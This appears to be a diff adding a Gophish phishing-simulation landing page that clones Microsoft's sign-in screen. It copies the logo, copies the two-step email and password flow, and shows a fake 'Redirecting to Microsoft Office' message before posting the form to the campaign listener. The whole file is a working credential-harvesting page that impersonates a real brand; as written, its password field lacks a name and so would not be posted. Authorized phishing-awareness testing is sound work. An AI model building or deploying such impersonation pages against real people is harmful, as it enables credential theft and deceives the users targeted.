@@ -1,0 +1,324 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Sign in to your account</title>
+
+    <style>
+        /* BASE STYLES & DESKTOP LAYOUT */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* The main white login box */
+        .login-box {
+            background-color: #ffffff;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            width: 440px;
+            box-sizing: border-box;
+            border-radius: 2px;
+            position: relative; /* Needed for the floating message */
+        }
+
+        /* FIX: Increased width and height to prevent logo/wordmark cutoff */
+        .microsoft-logo {
+            width: 150px; /* Sufficient width for symbol + wordmark */
+            height: 32px; /* Sufficient height to prevent vertical cutting */
+            margin-bottom: 24px;
+            display: block;
+        }
+
+        /* Two-step logic display elements */
+        .header-text {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-top: 10px;
+            margin-bottom: 12px;
+        }
+        
+        .user-display {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 20px;
+        }
+
+        /* Input and Form Styles */
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #ababab;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-bottom-color 0.3s;
+        }
+        .input-group input:focus {
+            border-bottom-color: #0067b8;
+        }
+
+        /* Buttons and Links */
+        .link-text {
+            color: #0067b8;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 15px;
+            width: fit-content;
+        }
+        .link-text:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 30px;
+        }
+
+        .action-button {
+            padding: 10px 20px;
+            border: 1px solid transparent;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 2px;
+            transition: background-color 0.3s, border-color 0.3s;
+        }
+
+        .secondary-button {
+            background-color: #ffffff;
+            color: #000000;
+            border-color: #e6e6e6;
+            margin-right: 10px;
+        }
+        .secondary-button:hover {
+            background-color: #e6e6e6;
+        }
+
+        .primary-button {
+            background-color: #0067b8;
+            color: #ffffff;
+        }
+        .primary-button:hover {
+            background-color: #005a9e;
+        }
+        
+        /* Gophish Helper / Dual-Step Logic */
+        .hidden {
+            display: none !important;
+        }
+
+        /* --- REDIRECT MESSAGE STYLES --- */
+        #redirectMessage {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #333;
+            color: #fff;
+            padding: 15px 20px;
+            text-align: center;
+            font-size: 14px;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+            z-index: 1000;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+        }
+        #redirectMessage.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        /* --- MOBILE RESPONSIVENESS FIXES (CRITICAL) --- */
+        @media (max-width: 600px) {
+            body {
+                background-color: #ffffff; /* White background on mobile */
+                align-items: flex-start; /* Start from the top */
+            }
+            .login-box {
+                width: 100%;
+                min-height: 100vh;
+                box-shadow: none; /* No shadow */
+                padding: 24px;
+                margin-top: 0;
+                border-radius: 0;
+            }
+            .button-group {
+                margin-top: 40px;
+                justify-content: space-between; /* Space out the buttons */
+            }
+        }
+    </style>
+
+</head>
+<body>
+    <div class="login-box">
+        <svg class="microsoft-logo" viewBox="0 0 160 32" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Microsoft">
+            <rect x="0" y="4" width="11" height="11" fill="#F25022"></rect>
+            <rect x="12" y="4" width="11" height="11" fill="#7FBA00"></rect>
+            <rect x="0" y="16" width="11" height="11" fill="#00A4EF"></rect>
+            <rect x="12" y="16" width="11" height="11" fill="#FFB900"></rect>
+
+            <text x="32" y="24" font-family="&#39;Segoe UI&#39;, Tahoma, Geneva, Verdana, sans-serif" font-size="24" font-weight="600" fill="#1b1b1b">Microsoft</text>
+        </svg>
+
+        <form method="POST" id="loginForm" action="">
+
+            <div id="usernameStep">
+                <h1 class="header-text">Sign in</h1>
+
+                <div class="input-group">
+                    <input type="text" placeholder="Email, phone, or Skype" id="usernameInput" name="username" required="" autocomplete="username"/>
+                </div>
+
+                <a href="#" class="link-text" onclick="event.preventDefault()">No account? Create one!</a>
+                <a href="#" class="link-text" onclick="event.preventDefault()">Can&#39;t access your account?</a>
+
+                <div class="button-group">
+                    <button type="button" class="action-button secondary-button" onclick="event.preventDefault()">Back</button>
+                    <button type="button" class="action-button primary-button" id="nextButton">Next</button>
+                </div>
+            </div>
+
+            <div id="passwordStep" class="hidden">
+                <a href="#" class="user-display" id="userDisplay" onclick="event.preventDefault()"></a>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Password" id="passwordInput" required="" autocomplete="current-password"/>
+                </div>
+
+                <a href="#" class="link-text" onclick="event.preventDefault()">Forgot password?</a>
+
+                <div class="button-group">
+                    <button type="button" class="action-button secondary-button" id="backButton">Back</button>
+                    <!-- Changed type to 'button' so we can intercept the click before submission -->
+                    <button type="button" class="action-button primary-button" id="submitButton">Sign in</button> 
+                </div>
+            </div>
+
+        </form>
+    </div>
+    
+    <!-- Redirect message added here -->
+    <div id="redirectMessage">Redirecting to Microsoft Office...</div>
+
+    <script>
+        // Gophish Two-Step Login Simulation Logic
+        const loginForm = document.getElementById('loginForm');
+        const usernameStep = document.getElementById('usernameStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const usernameInput = document.getElementById('usernameInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const nextButton = document.getElementById('nextButton');
+        const backButton = document.getElementById('backButton');
+        const userDisplay = document.getElementById('userDisplay');
+        const headerText = document.querySelector('#usernameStep .header-text');
+        const submitButton = document.getElementById('submitButton'); // New button reference
+        const redirectMessage = document.getElementById('redirectMessage'); // New message reference
+        
+        let formSubmitted = false; // Prevent multiple submissions
+
+        // Function to handle the form submission sequence
+        function handleSubmission(e) {
+            e.preventDefault(); // Stop the form submission immediately
+
+            if (formSubmitted || passwordInput.value.trim().length === 0) {
+                return; // Do nothing if already submitted or password is empty
+            }
+
+            formSubmitted = true;
+            
+            // 1. Disable the sign-in button
+            submitButton.disabled = true;
+            submitButton.textContent = 'Signing in...';
+            submitButton.style.backgroundColor = '#999'; // Dim the button
+
+            // 2. Display the redirect message at the bottom of the screen
+            redirectMessage.classList.add('visible');
+
+            // 3. Wait a moment (e.g., 1500ms or 1.5 seconds)
+            setTimeout(() => {
+                // 4. Submit the form to Gophish's listener
+                loginForm.submit();
+
+                // Gophish will now intercept the username/password and perform the
+                // redirect using the Redirect URL set in the campaign.
+
+            }, 1500); 
+        }
+
+        // Intercept the click on the "Sign in" button
+        submitButton.addEventListener('click', handleSubmission);
+
+
+        // --- Existing Two-Step Logic ---
+
+        // Handle Next button click (Transition from Email to Password)
+        nextButton.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+
+            if (username.length > 0) {
+                // 1. Update the display with the entered email
+                userDisplay.textContent = '← ' + username;
+                
+                // 2. Change header text
+                headerText.textContent = username;
+
+                // 3. Hide Username step and show Password step
+                usernameStep.classList.add('hidden');
+                passwordStep.classList.remove('hidden');
+
+                // 4. Focus on the password input field
+                passwordInput.focus();
+            } else {
+                console.error('Please enter an email address.');
+            }
+        });
+
+        // Handle Back button click (Transition from Password back to Email)
+        backButton.addEventListener('click', () => {
+            // 1. Change header text back
+            headerText.textContent = 'Sign in';
+            
+            // 2. Hide Password step and show Username step
+            passwordStep.classList.add('hidden');
+            usernameStep.classList.remove('hidden');
+
+            // 3. Clear the password input and focus on username
+            passwordInput.value = '';
+            usernameInput.focus();
+        });
+
+        // Prevent the form from submitting if the user presses Enter on the username field
+        usernameInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nextButton.click();
+            }
+        });
+
+        // Allow Enter key to trigger the submit handler on the password step
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                handleSubmission(e);
+            }
+        });
+    </script>
+
+
+</body></html>
